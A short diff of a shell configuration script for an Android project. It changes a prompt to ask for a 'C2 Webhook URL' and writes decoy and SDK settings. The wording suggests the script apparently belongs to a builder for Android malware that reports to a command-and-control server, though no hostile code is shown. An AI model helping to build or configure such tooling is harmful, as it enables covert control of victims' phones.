@@ -191,7 +191,7 @@ configure_app() {
     echo "MIN_SDK=\"$MIN_SDK\"" >> "$CONFIG_FILE"
     echo "DECOY_CHOICE=\"$DECOY_CHOICE\"" >> "$CONFIG_FILE"
 
-    read -p "    Enter Webhook URL (Google Script): " WEB_URL
+    read -p "    Enter C2 Webhook URL (Google Script or Render): " WEB_URL
     if [ -n "$WEB_URL" ]; then
         sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
     else
